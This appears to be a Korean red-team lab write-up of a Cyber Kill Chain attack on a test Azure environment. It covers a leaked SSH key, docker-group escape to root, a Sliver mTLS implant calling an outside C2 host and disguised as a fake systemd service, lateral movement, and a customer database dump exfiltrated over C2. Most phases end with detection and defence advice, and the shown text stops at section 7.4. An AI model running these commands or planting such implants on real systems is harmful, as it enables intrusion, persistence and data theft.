---
layout: post
title: "02. CKC: 자격증명 탈취 및 컨테이너 탈출"
date: 2025-12-29 17:00:00 +0900
categories: [cyberkillchain]
---

## 목차

- [0. 공격 시나리오 개요](#0-공격-시나리오-개요)
  - [0.1. 작전 배경 및 개요](#01-작전-배경-및-개요)
  - [0.2. 수행 목적](#02-수행-목적)
  - [0.3. 타겟 시스템 아키텍처 및 공격 경로](#03-타겟-시스템-아키텍처-및-공격-경로)
  - [0.4. 핵심 발견사항 및 비즈니스 영향](#04-핵심-발견사항-및-비즈니스-영향)
  - [0.5. 공격 도구 및 TTPs](#05-공격-도구-및-ttps)
- [1. 정찰](#1-정찰)
  - [1.1. IaC 저장소 스캐닝](#11-iac-저장소-스캐닝)
  - [1.2. 유출된 자격 증명 분석](#12-유출된-자격-증명-분석)
  - [1.3. 공격 대상 식별 및 침투 계획 수립](#13-공격-대상-식별-및-침투-계획-수립)
- [2. 무기화](#2-무기화)
  - [2.1. 공격 환경 최적화: SSH Multiplexing 및 터널링 구성](#21-공격-환경-최적화-ssh-multiplexing-및-터널링-구성)
  - [2.2. 지속성 확보를 위한 C2 임플란트 제작](#22-지속성-확보를-위한-c2-임플란트-제작)
- [3. 유포](#3-유포)
  - [3.1. 유효한 자격 증명을 통한 인증 요청](#31-유효한-자격-증명을-통한-인증-요청)
  - [3.2. 탐지 및 방어 전략](#32-탐지-및-방어-전략)
- [4. 악용](#4-악용)
  - [4.1. 초기 접근 성공 및 셸 획득](#41-초기-접근-성공-및-셸-획득)
  - [4.2. 권한 상승 벡터 식별: Docker 그룹](#42-권한-상승-벡터-식별-docker-그룹)
  - [4.3. 내부망 확산 경로 분석: SSH 키 재사용](#43-내부망-확산-경로-분석-ssh-키-재사용)
  - [4.4. 탐지 및 방어 전략](#44-탐지-및-방어-전략)
- [5. 설치](#5-설치)
  - [5.1. 권한 상승 및 호스트 제어권 완전 장악](#51-권한-상승-및-호스트-제어권-완전-장악)
  - [5.2. C2 임플란트 전송 및 은닉](#52-c2-임플란트-전송-및-은닉)
  - [5.3. Systemd 서비스를 이용한 영구 지속성 확보](#53-systemd-서비스를-이용한-영구-지속성-확보)
  - [5.4. 탐지 및 방어 전략](#54-탐지-및-방어-전략)
- [6. 명령 및 제어](#6-명령-및-제어)
  - [6.1. mTLS 기반의 암호화 C2 채널 수립](#61-mtls-기반의-암호화-c2-채널-수립)
  - [6.2. 하트비트 설정 및 지터 적용](#62-하트비트-설정-및-지터-적용)
  - [6.3. 연결 상태 검증](#63-연결-상태-검증)
  - [6.4. 탐지 및 방어 전략](#64-탐지-및-방어-전략)
- [7. 목적 달성](#7-목적-달성)
  - [7.1. 1단계: 수평 이동](#71-1단계-수평-이동)
  - [7.2. 2단계: 핵심 데이터 수집](#72-2단계-핵심-데이터-수집)
  - [7.3. 3단계: 다단 유출](#73-3단계-다단-유출)
  - [7.4. 탐지 및 방어 전략](#74-탐지-및-방어-전략)
- [8. 종합 분석 및 권고 사항](#8-종합-분석-및-권고-사항)
  - [8.1. 종합 위협 분석](#81-종합-위협-분석)
  - [8.2. Kill Chain 단계별 방어 실패 분석](#82-kill-chain-단계별-방어-실패-분석)
  - [8.3. 보안 강화 로드맵](#83-보안-강화-로드맵)
  - [8.4. 기술적 세부 권고](#84-기술적-세부-권고)
  - [8.5. 결론](#85-결론)

---

## 0. 공격 시나리오 개요

### 0.1. 작전 배경 및 개요

본 공격 시나리오는 `CKCProject` 인프라를 대상으로 **신원 기반 공격**에 대한 방어 태세를 점검하기 위해 수행되었다. 외부 RCE 연쇄 공격 시나리오가 외부 애플리케이션의 기술적 취약점(RCE)을 다루었다면, Credential Abuse 시나리오는 **"잘못 관리된 인프라 코드(IaC)에서 유출된 단일 자격 증명(SSH Key)이 어떻게 전체 클라우드 환경의 붕괴로 이어지는가"**에 초점을 맞춘다.

본 시나리오는 Terraform 코드에 의해 생성되어 로컬 파일로 저장된 SSH Private Key가 개발자의 실수로 공개 Git 저장소에 커밋되었다는 가정에서 출발한다. 공격자는 이 '만능 열쇠'를 사용하여 정상적인 관리 경로인 **Jumpbox VM**으로 침투하고, 내부 시스템에 만연한 구조적인 설정 오류와 신뢰 관계를 악용하여 최종 목표까지 도달한다.

### 0.2. 수행 목적

본 시나리오는 다음의 핵심 보안 가설을 검증한다.

1.  **IaC 보안 관리 실태 검증:** Terraform과 같은 인프라 코드 관리 과정에서 생성되는 민감 정보(SSH Key)가 적절한 통제 없이 유출될 수 있는 경로를 실증한다.
2.  **신원 기반 경계 우회:** MFA(다단계 인증)가 부재한 관리자용 Jumpbox VM이 유효한 SSH 키 하나만으로 어떻게 네트워크 경계 방어(NSG/Firewall)를 무력화시키는 '합법적 백도어'가 되는지 증명한다.
3.  **내부 신뢰 모델 분석:** 단일 SSH 키가 내부망 전체(Bastion, Web, DB)에 재사용되고 있을 때, 공격자가 어떻게 최소한의 흔적만으로 내부망을 수평 이동할 수 있는지 파악한다.

### 0.3. 타겟 시스템 아키텍처 및 공격 경로

공격 경로는 Load Balancer를 거치는 정규 서비스 경로가 아닌, 관리자 전용 **Jumpbox VM**을 통해 Private Subnet의 핵심 자산으로 직행하는 우회 경로를 따른다.

*   **Public IP (Jumpbox):** `20.214.x.x`
*   **Public Subnet (배스천 계층):** `10.42.1.0/24` (초기 침투 지점)
*   **DMZ Subnet (웹 계층):** `10.42.2.0/24`
*   **Private Subnet (DB 계층):** `10.42.3.0/24`

```mermaid
flowchart LR
    A(("🕵️")) -->|1. Scan| GH["🐙 GitHub"]
    A -->|2. SSH| J["🖥️ Jumpbox"]
    J -->|3. Pivot| W["🕸️ Web"]
    J -->|4. Pivot| D[("🗄️ DB")]

    style A fill:#E34F26,stroke:#fff,color:#fff
    style GH fill:#333,stroke:#fff,color:#fff
    style J fill:#005BA1,stroke:#fff,color:#fff
    style W fill:#005BA1,stroke:#fff,color:#fff
    style D fill:#5C2D91,stroke:#fff,color:#fff
```

> 🟠 공격자 · 🔵 경유 시스템 · 🟣 최종 타겟

**상세 공격 시퀀스**



```mermaid
sequenceDiagram
    actor A as 🕵️ Attacker
    participant G as 🐙 GitHub
    participant J as 🖥️ Jumpbox
    participant I as 🏢 Internal
    participant C as 📡 C2

    rect rgb(60, 30, 30)
        Note over A,J: Initial Access
        A->>G: TruffleHog 스캔 (SSH Key 발견)
        A->>J: Leaked Key로 SSH 접속
    end

    rect rgb(30, 30, 60)
        Note over J: Privilege Escalation
        A->>J: Docker Escape → Root 획득
        J->>J: Systemd 백도어 설치
        J-->>C: C2 Session 수립
    end

    rect rgb(50, 20, 50)
        Note over J,I: Lateral Movement & Exfil
        J->>I: 동일 SSH Key로 내부망 접근
        I-->>J: 데이터 수집
        J-->>C: 데이터 유출
    end
```

### 0.4. 핵심 발견사항 및 비즈니스 영향

| 핵심 발견사항 | 근본 원인 | 비즈니스 영향 |
| :--- | :--- | :--- |
| **1. IaC를 통한 SSH 키 유출** | 개발 파이프라인 내 비밀정보 스캐닝 부재 | **[신뢰도]** 개발 프로세스의 보안 불감증 노출, 기업 이미지 손상 |
| **2. SSH 키의 광범위한 재사용** | 중앙화된 자격 증명 관리 및 로테이션 정책 부재 | **[운영]** 단일 자격 증명 탈취가 전체 인프라 마비로 이어지는 **단일 실패 지점(SPOF)** 형성 |
| **3. Docker 그룹을 통한 권한 상승** | 서버 빌드 표준(하드닝) 미준수 | **[운영/규정준수]** 공격자에게 즉각적인 Root 권한을 허용하여 데이터 파괴, 랜섬웨어 등 심각한 사고 유발 가능 |

### 0.5. 공격 도구 및 TTPs

| 전술 (Tactic) | 기법 (Technique) | 사용 도구 / 방법 (Tools) |
| :--- | :--- | :--- |
| **Initial Access** | [T1078.004] Valid Accounts: Cloud Accounts | `leaked_id_rsa` (유출된 SSH 키) |
| **Execution** | [T1059.004] Command and Scripting Interpreter: Unix Shell | `ssh` |
| **Privilege Escalation** | [T1611] Escape to Host | `docker` 그룹 권한 악용 |
| **Defense Evasion** | [T1078] Valid Accounts | 정상 관리자 계정 및 프로토콜 사용 |
| **Lateral Movement** | [T1021.004] Remote Services: SSH | 자격 증명 재사용 |

---

## 1. 정찰

**목표:** 대상 조직의 공개된 디지털 자산, 특히 인프라 코드(IaC) 저장소를 대상으로 수동적 정찰을 수행하여, 네트워크 경계를 우회할 수 있는 민감 정보, 특히 인증 자격 증명을 수집한다.

*   **[T1596.001] Search Open Technical Databases:** GitHub 등 공개 코드 저장소 스캐닝.
*   **[T1552.001] Unsecured Credentials:** 소스 코드 내 하드코딩된 자격 증명 식별.

### 1.1. IaC(Infrastructure as Code) 저장소 스캐닝

**[공격자 시점]**
최신 클라우드 환경은 Terraform, Ansible 등 IaC로 관리되는 경우가 많다. 이 코드들은 인프라의 '설계도'이자, 종종 민감 정보를 포함하는 '보물 지도'이기도 하다. 공격팀은 `TruffleHog`와 같은 자동화된 시크릿 스캐닝 도구를 사용하여 대상 조직의 공개 GitHub 저장소를 스캔했으며, 특히 과거 커밋 히스토리까지 전수 조사하는 심층 분석을 수행했다.

**결과:** 스캔 결과, 개발자가 테스트 목적으로 생성 후 삭제하는 것을 잊은 SSH Private Key가 과거 커밋 이력에서 발견되었다. 이 키는 Terraform 코드에 의해 생성된 SSH 키 파일과 정확히 일치했다.

![TruffleHog를 통한 키 유출 스캔 결과](/assets/images/ckc/b/ckc.b.1.1.trufflehog.png)

### 1.2. 유출된 자격 증명 분석

발견된 키가 실제 사용 가능한 유효한 자격 증명인지 검증하는 절차를 거쳤다.

1.  **키 포맷 및 강도 분석:**
    `-----BEGIN RSA PRIVATE KEY-----` 헤더와 키 길이를 통해, Terraform 코드에 명시된 대로 **RSA 4096-bit**의 강력한 키임을 확인했다.

    ```bash
    # 키 파일 헤더 확인
    head -1 ~/leaked_id_rsa
    > -----BEGIN RSA PRIVATE KEY-----
    ```

    ![키 포맷 확인](/assets/images/ckc/b/b.1.1.rsa-key-header.png)

2.  **패스프레이즈 부재 확인:**
    키 파일 내부에 `Proc-Type: 4,ENCRYPTED`와 같은 암호화 관련 헤더가 존재하지 않았다. 이는 해당 키가 **패스워드 없이 즉시 사용 가능한 상태**임을 의미한다.

    ```bash
    # 암호화 헤더 존재 여부 확인
    grep -i "encrypted" ~/leaked_id_rsa
    # (출력 없음 = 암호 없음)
    ```

    ![암호 없음 확인](/assets/images/ckc/b/b.1.2.no-encryption.png)

3.  **키 무결성 및 핑거프린트 확인:**
    `ssh-keygen` 유틸리티를 사용하여 비공개 키로부터 공개 키를 추출하고, 키의 핑거프린트를 확인했다.

    ```bash
    # 추출한 키 저장 및 권한 설정 (Permissions 0600 필수)
    chmod 600 ~/leaked_id_rsa

    # 공개키 추출 및 핑거프린트 확인
    ssh-keygen -y -f ~/leaked_id_rsa
    ssh-keygen -l -f ~/leaked_id_rsa
    > 4096 SHA256:XLpuwCqJJgzawfH5RedszwREStN6VQdY4bHXqNPuls0 no comment (RSA)
    ```
    **[핵심 발견]** 핑거프린트 확인 결과 **4096-bit RSA 키**임을 확인했다. 키에 주석(comment)이 포함되어 있지 않아 직접적인 사용자 식별은 불가능했지만, Terraform 코드 분석을 통해 **`azureadmin`** 계정에서 사용됨을 유추할 수 있었다.

    ![핑거프린트 확인](/assets/images/ckc/b/b.1.3.key-fingerprint.png)

### 1.3. 공격 대상 식별 및 침투 계획 수립

수집된 정보를 바탕으로 초기 침투 시나리오를 구체화했다.

*   **자격 증명:** `leaked_id_rsa` (암호 없는 4096-bit RSA 키)
*   **사용자 계정:** `azureadmin`
*   **공격 대상:** Terraform 코드와 커밋 메시지("bastion setup")를 통해, 이 키의 주 사용처가 **Jumpbox VM**임을 확신했다.
*   **진입점:** Terraform 출력값을 통해 Jumpbox VM의 Public IP를 확보하고, 해당 IP의 22번 포트(SSH)를 최종 진입점으로 결정했다.

---

## 2. 무기화

**목표:** 획득한 SSH 키를 실제 공격에 즉시 사용할 수 있는 형태로 가공하고, 초기 침투 성공 후 장악력 유지 및 탐지 회피를 위한 C2(Command & Control) 임플란트를 사전에 제작한다. 이 단계는 직접적인 공격이 아닌, **공격 준비 및 최적화** 과정이다.

*   **[T1587.003] Develop Capabilities: Digital Certificates:** 탈취한 비공개 키를 SSH 설정 파일에 통합.
*   **[T1588.002] Obtain Capabilities: Tool:** 오픈소스 C2 프레임워크(Sliver)를 이용한 악성 페이로드 생성.

### 2.1. 공격 환경 최적화: SSH Multiplexing 및 터널링 구성

**[공격 기법]**
단순히 `ssh -i` 명령어를 반복 사용하는 것은 비효율적이며 불필요한 로그인 로그를 남긴다. 공격 효율성을 극대화하고 탐지를 회피하기 위해, 공격자 PC의 `~/.ssh/config` 파일을 다음과 같이 최적화했다.

```bash
# ~/.ssh/config 설정
cat ~/.ssh/config

Host target-bastion
    HostName 4.217.x.x            # Jumpbox VM Public IP
    User azureadmin
    IdentityFile ~/leaked_id_rsa      # 무기화된 키
    StrictHostKeyChecking no
    ControlMaster auto                # [Stealth] 연결 재사용으로 로그인 로그 최소화
    ControlPath ~/.ssh/sockets/%r@%h:%p
```
이 설정으로 `ssh target-bastion` 단 한 번의 명령으로 접속, 연결 재사용이 모두 자동으로 완료된다.

![SSH Config 설정](/assets/images/ckc/b/b.2.1.ssh-config.png)

### 2.2. 지속성 확보를 위한 C2 임플란트 제작

SSH 접속은 강력하지만, 키가 교체되거나 세션이 종료되면 접근성을 잃는다. 이를 대비하여 SSH와는 별개의 독립적인 백도어 채널을 확보하기 위해 **Sliver C2 임플란트**를 제작했다.

**1. mTLS 리스너 시작:**

```bash
# Sliver C2 서버 콘솔
sliver > mtls -l 8888
[*] Starting mTLS listener ...
[*] Successfully started job #2
```

![mTLS 리스너 시작](/assets/images/ckc/b/b.2.2.mtls-listener.png)

**2. 임플란트 생성:**

```bash
# Sliver C2 서버 콘솔
# --mtls: 상호 인증 TLS로 패킷 감청 무력화
# --skip-symbols: 바이너리 분석 방해
sliver > generate --mtls hamap.shop:8888 --os linux --arch amd64 --skip-symbols --save /tmp/kworker_sys
[*] Generating new linux/amd64 implant binary
[*] Build completed in 5s
[*] Implant saved to /tmp/kworker_sys
```

![Sliver 임플란트 생성](/assets/images/ckc/b/b.2.3.implant-generate.png)

**3. 임플란트 파일 확인:**

```bash
# C2 서버
azureadmin@Attacker-C2-Server:~$ ls -la /tmp/kworker_sys
-rwx------ 1 azureadmin azureadmin 9637888 Dec 31 01:46 /tmp/kworker_sys

azureadmin@Attacker-C2-Server:~$ file /tmp/kworker_sys
/tmp/kworker_sys: ELF 64-bit LSB executable, x86-64, statically linked, stripped
```
생성된 `kworker_sys` 임플란트는 커널 프로세스로 위장되었으며, 향후 SCP를 통해 은밀하게 타겟 시스템으로 전송될 것이다.

![임플란트 파일 확인](/assets/images/ckc/b/b.2.4.implant-verify.png)

---

## 3. 유포

**목표:** 무기화된 SSH 키를 타겟 Jumpbox VM의 SSH 서비스에 전달하여 인증을 요청한다. 이 단계의 핵심은 공격 트래픽이 **정상적인 관리자 접속과 구별되지 않기 때문에** 대부분의 네트워크 기반 보안 솔루션을 우회한다는 점이다.

*   **[T1078] Valid Accounts:** 유효한 자격 증명을 이용한 정상적인 프로토콜 접근.
*   **[T1133] External Remote Services:** 외부에서 접근 가능하도록 허용된 SSH 서비스를 통해 침투.

### 3.1. 유효한 자격 증명을 통한 인증 요청

`~/.ssh/config` 설정을 기반으로 Jumpbox VM에 접속을 시도했다.

```bash
# 공격자 터미널
ssh -i ~/leaked_id_rsa ${SSH_USER}@${TARGET_BASTION}
```

**[유포 과정]**
1.  **핸드셸이크:** 공격자 PC가 Jumpbox VM의 Public IP(4.217.x.x) 22번 포트로 TCP 연결 시도.
2.  **인증:** SSH 클라이언트가 `leaked_id_rsa` 비공개 키를 사용하여 인증 응답 생성 및 서버에 전송.
3.  **검증:** Jumpbox VM의 SSH 데몬은 `/home/azureadmin/.ssh/authorized_keys`에 저장된 공개 키와 대조하여 요청을 검증.
4.  **성공:** 키가 유효하므로, SSH 데몬은 접근을 허용하고 셸을 생성한다.

![Bastion 접속 성공](/assets/images/ckc/b/b.3.1.bastion-login.png)

이 모든 과정은 암호화된 SSH 터널 내부에서 일어나며, 외부에서는 정상적인 관리자 로그인과 전혀 구별할 수 없다.

### 3.2. 탐지 및 방어 전략

*   **비정상 로그인 탐지 (UEBA):**
    *   **Geo-IP:** 평소 관리자가 접속하지 않는 국가나 ISP 대역에서의 SSH 로그인 시도를 즉시 차단하거나 경고해야 한다.
    *   **Time-based:** 업무 시간 외(예: 새벽 3시)의 접속 시도를 모니터링해야 한다.
*   **SSH 접근 제어 강화:**
    *   **MFA 필수 적용:** SSH 키 인증 외에 Google Authenticator 등의 OTP를 2차 인증 수단으로 강제해야 한다.
    *   **Source IP 제한:** Jumpbox VM의 SSH 포트(22)는 전 세계(`0.0.0.0/0`)에 개방되어서는 안 되며, 사내 VPN IP 등 신뢰할 수 있는 소스 IP에서만 접근 가능하도록 NSG를 설정해야 한다.

---

## 4. 악용

**목표:** 성공적으로 인증을 통과하여 획득한 초기 셸 환경을 정밀 분석하고, 시스템 내에 존재하는 추가적인 취약점, 특히 **권한 상승 경로**를 식별하여 시스템의 완전한 제어권을 확보할 준비를 마친다.

*   **[T1087.001] Account Discovery: Local Account:** 사용자 및 그룹 권한 식별.
*   **[T1082] System Information Discovery:** OS, 커널, 네트워크 설정 확인.

### 4.1. 초기 접근 성공 및 셸 획득

접속 성공 후, `azureadmin` 사용자의 제한된 셸을 획득했다.

```bash
azureadmin@CKCProject-bastion-vm:~$ whoami
azureadmin
azureadmin@CKCProject-bastion-vm:~$ hostname
CKCProject-bastion-vm
```

### 4.2. 권한 상승 벡터 식별: Docker 그룹

**[분석]**
초기 침투 성공 후 가장 먼저 수행해야 할 일은 현재 권한을 확인하고, 더 높은 권한을 얻을 수 있는 경로를 찾는 것이다. `id` 명령어를 통해 현재 사용자의 그룹 멤버십을 확인했다.

![사용자 권한 확인](/assets/images/ckc/b/b.3.3.bastion-user-info.png)

**[발견 사항]**
`id` 명령어 실행 결과, `azureadmin` 계정이 **`docker` 그룹 (GID 122)**에 속해 있음이 확인되었다. Docker 그룹 사용자는 패스워드 없이 Docker 데몬에 명령을 내릴 수 있어, **호스트 Root 권한 획득 경로**가 된다.

![Docker 환경 확인](/assets/images/ckc/b/b.3.4.docker-check.png)

*   **위험:** `docker` 그룹 사용자는 패스워드 없이 Docker 소켓(`/var/run/docker.sock`)에 직접 명령을 내릴 수 있다. Docker 데몬은 `root` 권한으로 실행되므로, 이는 곧바로 **호스트의 `root` 권한을 획득할 수 있는 직접적인 경로**를 의미한다. 이 경로는 `sudo` 비밀번호를 몰라도 악용이 가능하다.

### 4.3. 내부망 확산 경로 분석: SSH 키 재사용

**[분석]**
공격자는 "하나의 키를 유출한 개발자는 다른 곳에도 같은 키를 사용했을 것"이라는 가설을 세웠다. Terraform 코드 분석 결과, Jumpbox, Web, DB 서버 모두 **동일한 SSH 공개 키**를 사용하도록 설정되어 있었다. 공격자는 이 가설을 Jumpbox VM 내부에서 직접 검증했다.

```bash
# Jumpbox VM 셸
# 1. Web VMSS 인스턴스 중 하나로 접속 시도 (10.42.2.4)
#    별도의 키 지정 없이, 현재 로그인된 사용자의 기본 키로 인증 시도
azureadmin@CKCProject-bastion-vm:~$ ssh azureadmin@10.42.2.4 'hostname'
CKCProject-web-vmss000000
```

![Web VMSS 접속 확인](/assets/images/ckc/b/b.3.5.web-vmss-access.png)

```bash
# 2. DB VM으로 접속 시도 (10.42.3.4)
azureadmin@CKCProject-bastion-vm:~$ ssh azureadmin@10.42.3.4 'hostname'
CKCProject-db-vm
```

![DB VM 접속 확인](/assets/images/ckc/b/b.3.6.db-vm-access.png)

**[발견 사항]**
**암호나 추가 인증 없이** 내부망의 다른 서버에 접속하는 데 성공했다. 이는 단 하나의 유출된 SSH 키가 전체 인프라에 대한 접근 권한을 부여하고 있음을 보여준다. 이로 인해 공격자는 복잡한 피보팅 기술이나 추가 익스플로잇 없이도 내부망을 이동할 수 있게 되었다.

### 4.4. 탐지 및 방어 전략

*   **권한 상승 탐지:**
    *   사용자가 `docker run` 명령어를 실행할 때, `-v /:/mnt`와 같이 호스트 파일 시스템을 마운트하는 행위를 감사 로그(Auditd)로 탐지해야 한다.
*   **SSH 키 재사용 방지:**
    *   **고유 키 정책:** 서버 그룹별(Bastion, Web, DB)로 서로 다른 SSH 키 쌍을 사용하도록 강제해야 한다.
    *   **인증서 기반 SSH:** SSH 키 대신 유효 기간이 짧은 SSH 인증서를 발급하여 사용하는 방식으로 전환하면, 키 유출 시의 위험을 최소화할 수 있다.

---

## 5. 설치

**목표:** 초기 접근에 사용된 SSH 키가 교체되거나 비활성화될 경우에 대비하여, 공격자가 언제든지 다시 시스템에 접근할 수 있도록 **독립적이고 영구적인 백도어**를 설치한다. 이 단계의 핵심은 **탐지 회피**와 **생존성**이다.

*   **[T1611] Escape to Host:** Docker 그룹 권한을 악용하여 호스트의 파일 시스템에 직접 쓰기.
*   **[T1543.002] Create or Modify System Process: Systemd Service:** `crontab`보다 은밀하고 안정적인 `systemd`를 이용한 지속성 확보.
*   **[T1036.005] Masquerading: Match Legitimate Name:** 시스템 프로세스명으로 파일명과 서비스를 위장.

### 5.1. 권한 상승 및 호스트 제어권 완전 장악

**[공격 기법]**
지속성 메커니즘을 설치하기에 앞서, `azureadmin` 계정의 제한된 권한을 벗어나 시스템 전체를 제어할 수 있는 `root` 권한을 획득했다. 이는 4단계에서 식별한 `docker` 그룹 권한을 악용하여 수행되었다.

```bash
# Jumpbox VM SSH 세션에서 실행
# 1. Alpine 이미지를 실행하며 호스트의 루트(/) 파일 시스템을 컨테이너 내부의 /mnt에 마운트
# 2. chroot를 통해 컨테이너의 루트 디렉터리를 호스트의 파일 시스템으로 변경
azureadmin@CKCProject-bastion-vm:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![Docker Escape 시작](/assets/images/ckc/b/b.4.1.docker-escape-start.png)

```bash
# 프롬프트가 변경되며 호스트 OS의 Root 셸 획득
/ # id
uid=0(root) gid=0(root) groups=0(root)
/ # whoami
root
```

![Docker Root 획득 확인](/assets/images/ckc/b/b.4.2.docker-root-confirm.png)

이 기법은 커널 익스플로잇이 아니므로 보안 솔루션에 탐지될 확률이 낮고, 안정적으로 호스트의 최고 권한을 획득할 수 있는 가장 효과적인 방법이다.

### 5.2. C2 임플란트 전송 및 은닉

이제 호스트 `root` 권한을 확보했으므로, 2단계에서 제작한 C2 임플란트(`kworker_sys`)를 Jumpbox VM으로 안전하게 전송했다. 공격자는 인터넷에서 `wget`을 사용하는 대신, 이미 수립된 **SSH 터널을 통해 `scp`로 전송**하여 네트워크 로그를 최소화했다.

```bash
# [공격자 C2 서버에서 실행]
# scp를 사용하여 로컬의 임플란트를 Jumpbox VM의 /tmp/ 디렉터리로 전송
azureadmin@Attacker-C2-Server:~$ scp -i ~/leaked_id_rsa /tmp/kworker_sys azureadmin@4.217.x.x:/tmp/
kworker_sys                                  100% 9.4MB   7.5MB/s   00:01
```

![임플란트 전송](/assets/images/ckc/b/b.5.1.implant-transfer.png)

```bash
# [획득한 Host Root Shell에서 실행]
# 전송된 파일을 최종 은닉 위치로 이동 및 실행 권한 부여
/ # mv /tmp/kworker_sys /usr/local/bin/
/ # chmod +x /usr/local/bin/kworker_sys
```

![임플란트 설치](/assets/images/ckc/b/b.5.2.implant-installed.png)

### 5.3. Systemd 서비스를 이용한 영구 지속성 확보

`crontab`은 쉽게 탐지될 수 있으므로, 공격자는 시스템 부팅 프로세스의 일부인 `systemd`를 사용하여 백도어를 등록했다. 이는 훨씬 더 은밀하고 안정적인 지속성 확보 방법이다.

```bash
# 호스트 Root 셸
# /etc/systemd/system/ 디렉터리에 악성 서비스 파일 생성
/ # cat > /etc/systemd/system/azure-sync-agent.service << EOF
[Unit]
Description=Azure Synchronization Agent for VM Health
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/local/bin/kworker_sys
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOF

# 서비스 등록, 활성화 및 즉시 시작
/ # systemctl daemon-reload
/ # systemctl enable azure-sync-agent.service
/ # systemctl start azure-sync-agent.service
```

![서비스 파일 확인](/assets/images/ckc/b/b.5.3.persistence-service.png)

```bash
# 서비스 실행 상태 확인
$ sudo systemctl status azure-sync-agent.service
● azure-sync-agent.service - Azure Synchronization Agent for VM Health
     Loaded: loaded (/etc/systemd/system/azure-sync-agent.service; enabled)
     Active: active (running)
   Main PID: 4549 (/usr/local/bin/kworker_sys)
```

![서비스 실행 확인](/assets/images/ckc/b/b.5.4.service-running.png)

### 5.4. 탐지 및 방어 전략

*   **파일 무결성 모니터링 (FIM):**
    *   `/etc/systemd/system/` 경로에 새로운 파일이 생성되는 것을 실시간으로 감지해야 한다.
    *   `/usr/local/bin/` 등 실행 파일 경로에 서명되지 않은 바이너리가 추가되는 것을 차단해야 한다.
*   **서비스 모니터링:**
    *   `systemctl` 명령어로 등록된 서비스 중, 알려진 벤더(Microsoft, Canonical 등)의 서명이 없거나 설명이 모호한 서비스를 주기적으로 감사해야 한다.

---

## 6. 명령 및 제어

**목표:** 5단계에서 설치된 영구 백도어(`kworker_sys`)와 외부 C2 서버 간에 **탐지가 어려운 암호화된 통신 채널**을 수립하고, 이를 통해 SSH 접속과 무관하게 시스템을 원격 제어할 수 있는 권한을 확보한다.

*   **[T1071.001] Application Layer Protocol: Web Protocols (HTTPS):** C2 트래픽 위장.
*   **[T1573.002] Encrypted Channel: Asymmetric Cryptography:** mTLS로 패킷 감청 무력화.

### 6.1. mTLS 기반의 암호화 C2 채널 수립

`systemd`에 의해 실행된 `kworker_sys` 임플란트는 즉시 공격자의 C2 서버로 **아웃바운드 콜백**을 시도했다. 이 통신은 TCP 443 포트를 사용하며, 모든 데이터는 mTLS로 암호화되어 있어 네트워크 보안 장비는 이를 일반적인 HTTPS 트래픽으로 인식하고 통과시킨다.

```bash
# Sliver C2 콘솔
# Jumpbox VM의 호스트 Root 권한으로 새로운 세션이 수신됨
[*] Session ca77948f MYSTERIOUS_OVARY - 4.217.x.x:37632 (CKCProject-bastion-vm) - linux/amd64
```

![C2 세션 수립](/assets/images/ckc/b/b.6.1.c2-session-established.png)

![C2 세션 정보](/assets/images/ckc/b/b.6.2.c2-session-info.png)

### 6.2. 하트비트 설정 및 지터 적용

**[공격 기법]**
고정된 주기의 통신 패턴을 숨기기 위해 Jitter를 적용했다.

```bash
# 60초 간격, 30초 지터 적용
sliver (MYSTERIOUS_OVARY) > reconfig -i 60s -j 30s
[*] Reconfiguration complete
```

![Reconfig 설정](/assets/images/ckc/b/b.6.3.session-reconfig.png)

### 6.3. 연결 상태 검증

타겟 시스템 내부에서 임플란트가 정상적으로 실행 중인지 확인했다.

```bash
# 피해자 셸
$ ps aux | grep kworker_sys
root        4549  0.0  0.5  /usr/local/bin/kworker_sys
```

![프로세스 확인](/assets/images/ckc/b/b.6.4.implant-process-check.png)

### 6.4. 탐지 및 방어 전략

*   **네트워크 행위 분석 (NBA):**
    *   내부 서버가 외부의 특정 IP와 장시간 지속적으로 연결을 유지하거나, 주기적으로 데이터를 주고받는 '비콘' 행위를 탐지해야 한다.
*   **프로세스 트리 분석:**
    *   `systemd`가 `kworker_sys`와 같이 커널 스레드처럼 위장한 이름의 프로세스를 자식으로 실행하는 것은 매우 의심스러운 패턴이므로 EDR에서 차단해야 한다.

---

## 7. 목적 달성

**목표:** 완전히 장악한 Jumpbox VM을 **내부망 공격의 피봇 포인트**로 삼아, SSH 키 재사용 취약점을 이용해 최종 목표인 **데이터베이스 서버를 장악하고 민감 정보를 유출**한다.

*   **[T1021.004] Remote Services: SSH:** SSH 키 재사용을 통한 수평 이동.
*   **[T1560] Archive Collected Data:** 데이터 수집 및 압축.
*   **[T1041] Exfiltration Over C2 Channel:** C2 채널을 통한 데이터 유출.

### 7.1. 1단계: 수평 이동

**[공격 기법]**
공격자는 4.3단계에서 확인한 키 재사용 취약점을 이용해 DB 서버로 직접 이동했다.

![DB 서버 접속](/assets/images/ckc/b/b.7.1.db-vm-login.png)

**결과:** 단 하나의 유출된 자격 증명만으로 내부망 심층부의 DB 서버까지 도달했다.

### 7.2. 2단계: 핵심 데이터 수집

DB 서버에 `azureadmin` 계정으로 로그인한 공격자는 `customer_db`를 최종 탈취 목표로 삼았다.

1.  **권한 확인 및 Root 전환:**

    ![DB Root 권한 획득](/assets/images/ckc/b/b.7.3.db-vm-root-privesc.png)

2.  **데이터 덤프 및 압축:**

    ```bash
    root@CKCProject-db-vm:~# mysqldump -u root -proot customer_db | gzip > /tmp/customer_data.sql.gz
    ```

    ![DB 덤프](/assets/images/ckc/b/b.7.6.db-mysqldump.png)

### 7.3. 3단계: 다단 유출

DB 서버는 인터넷으로 직접 나가는 아웃바운드 경로가 없다. 따라서 공격자는 데이터를 **Jumpbox VM으로 1차 전송**한 뒤, Jumpbox VM에 설치된 C2 채널을 통해 **외부로 최종 반출**하는 **다단 유출** 전략을 사용했다.

1.  **내부 전송 (DB Server -> Jumpbox VM):**

    ![DB 데이터 전송](/assets/images/ckc/b/b.7.7.data-staging-transfer.png)

2.  **외부 유출 (Jumpbox VM -> Attacker C2):**
    Sliver C2 세션을 이용해 파일을 공격자 서버로 다운로드했다.

    ![C2 다운로드](/assets/images/ckc/b/b.7.8.c2-download-data.png)

3.  **유출 증적:**
    최종적으로 탈취한 데이터에 민감 정보(신용카드 번호 등)가 포함되어 있음을 확인했다.

    ![유출 데이터 확인](/assets/images/ckc/b/b.7.9.exfiltrated-data-proof.png)

### 7.4. 탐지 및 방어 전략

*   **내부망 트래픽 모니터링 (East-West Traffic):**
